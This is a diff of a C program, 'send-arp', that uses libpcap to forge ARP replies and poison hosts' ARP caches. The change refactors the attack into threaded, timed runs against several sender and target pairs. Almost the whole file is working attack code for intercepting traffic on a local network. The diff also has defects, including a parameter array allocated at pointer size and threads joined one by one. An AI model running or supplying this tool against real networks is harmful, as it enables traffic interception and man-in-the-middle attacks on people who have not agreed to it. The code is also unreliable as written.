@@ -10,10 +10,6 @@
 #include <pthread.h>
 #include <pcap/pcap.h>
 
-// TODO :
-// 1) modify ARP header(hardwareSize: 6, protocolSize: 4)
-// 2) solve segmentation fault. goto '// DEBUG'
-
 typedef struct ifreq ifreq_t;
 typedef struct pcap_pkthdr pcap_pkthdr_t;
 
@@ -43,6 +39,67 @@ typedef struct {
     uint32_t targetIpAddr;
 } ARPheader;
 #pragma pack(pop)
+
+typedef struct {
+    int32_t sec;
+    int8_t * interface,
+           * senderIPstr,
+           * targetIPstr;
+} DoAttackParam, * pDoAttackParam;
+
+int32_t   readWholeTextData  (int8_t    * fileName,  int8_t        ** pBuffer);
+uint32_t  getSelfIPv4Addr    (int8_t    * interface);
+uint32_t  parseIPv4Addr      (int8_t    * ipAddrStr);
+int32_t   getSelfMacAddr     (int8_t    * interface, uint8_t       * out);
+int32_t   makeWholeArpPacket (MACheader * macHdr,    ARPheader     * arpHdr,   uint8_t  ** outBuf, int32_t * outSize);
+uint32_t checkInterfaceName  (int8_t    * interfaceName);
+void     printBuffer         (int8_t    * title,     const uint8_t * buffer,   uint32_t size);
+void *   doAttack            (void      * vparam);
+
+int main(int argc, char ** argv) {
+    if (argc < 5 || !(argc & 1)) {
+        printf("Error: At least four command-line arguments are required.\n"
+               "syntax: send-arp <time (sec)> <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n"
+               "sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
+
+        return 1;
+    }
+
+    if (!checkInterfaceName(argv[2])) {
+        printf("Error: Please refrain from entering abnormal entries.\n");
+
+        return 1;
+    }
+
+    int status;
+
+    int32_t       sec            = atoi(argv[1]);
+    uint32_t      pthreadSize    = (argc - 3) >> 1;
+    int8_t        * interface    = argv[2];
+    pthread_t     * pthread      = calloc(pthreadSize, sizeof(pthread_t));
+    DoAttackParam * pthreadParam = calloc(pthreadSize, sizeof(pDoAttackParam));
+
+    for (uint32_t i = 0, argIdx = 3; i < pthreadSize; i++, argIdx++) {
+        (pthreadParam + i)->sec         = sec;
+        (pthreadParam + i)->interface   = interface;
+        (pthreadParam + i)->senderIPstr = argv[argIdx];
+        (pthreadParam + i)->targetIPstr = argv[++argIdx];
+
+        if (pthread_create(pthread + i, NULL, doAttack, pthreadParam + i) < 0) {
+            printf("[Error] Thread (senderIP : %s / targetIP : %s) creating FAILED.", 
+                (pthreadParam + i)->senderIPstr, 
+                (pthreadParam + i)->targetIPstr
+            );
+        }
+
+        pthread_join(pthread[i], (void **)&status);
+    }
+
+    free(pthreadParam);
+    free(pthread);
+
+    return 0;
+}
 
 int32_t readWholeTextData(int8_t * fileName, int8_t ** pBuffer) {
     FILE * fp;
@@ -148,29 +205,16 @@ void printBuffer(int8_t * title, const uint8_t * buffer, uint32_t size) {
     puts("");
 }
 
-int main(int argc, char ** argv) {
-    if (argc < 4) {
-        printf("Error: At least four command-line arguments are required.\n"
-               "syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n"
-               "sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
-
-        return 1;
-    }
-
-    if (!checkInterfaceName(argv[1])) {
-        printf("Error: Please refrain from entering abnormal entries.\n");
-
-        return 1;
-    }
-
+void * doAttack(void * vparam) {
     uint8_t attackerMacAddr[6],
             senderMacAddr[6];
+
+    DoAttackParam param          = *(pDoAttackParam)vparam;
+    uint32_t      attackerIPAddr = getSelfIPv4Addr(param.interface),
+                  senderIPAddr   = parseIPv4Addr(param.senderIPstr),
+                  targetIPAddr   = parseIPv4Addr(param.targetIPstr);
     
-    uint32_t attackerIPAddr = getSelfIPv4Addr(argv[1]),
-             senderIPAddr   = parseIPv4Addr(argv[2]),
-             targetIPAddr   = parseIPv4Addr(argv[3]);
-    
-    getSelfMacAddr(argv[1], attackerMacAddr);
+    getSelfMacAddr(param.interface, attackerMacAddr);
 
     MACheader macHdr = { .etherType = htons(0x0806) };
     ARPheader arpHdr = { 
@@ -197,8 +241,8 @@ int main(int argc, char ** argv) {
     makeWholeArpPacket(&macHdr, &arpHdr, &buffer, &bufSize);
     printBuffer("Sent Packet", buffer, bufSize);
 
-    pcap_t  * pcap      = pcap_open_live(argv[1], 0, 0, 0, errBuf),
-            * pcapReply = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errBuf);
+    pcap_t  * pcap      = pcap_open_live(param.interface, 0, 0, 0, errBuf),
+            * pcapReply = pcap_open_live(param.interface, BUFSIZ, 1, 1000, errBuf);
 
     while (1) {
         const uint8_t * packet;
@@ -221,7 +265,7 @@ int main(int argc, char ** argv) {
         if (!NULL
             && ntohs(((MACheader *)packet)->etherType) == 0x0806 
             && ntohs(((ARPheader *)(packet + sizeof(MACheader)))->opcode) == 0x0002
-            && ((ARPheader *)(packet + sizeof(MACheader)))->senderIpAddr == parseIPv4Addr(argv[2]))
+            && ((ARPheader *)(packet + sizeof(MACheader)))->senderIpAddr == senderIPAddr)
         {
             memcpy(senderMacAddr, ((ARPheader *)(packet + sizeof macHdr))->senderMacAddr, 6);
             
@@ -249,7 +293,7 @@ int main(int argc, char ** argv) {
     makeWholeArpPacket(&macHdr, &arpHdr, &buffer, &bufSize);
     printBuffer("Sent Packet for ATTACK", buffer, bufSize);
 
-    while (1) {
+    for (int32_t i = 0; i < param.sec; i++) {
         pcap_sendpacket(pcap, buffer, bufSize);
         sleep(1);
     }
@@ -257,6 +301,4 @@ int main(int argc, char ** argv) {
     pcap_close(pcapReply);
     pcap_close(pcap);
     free(buffer);
-
-    return 0;
 }
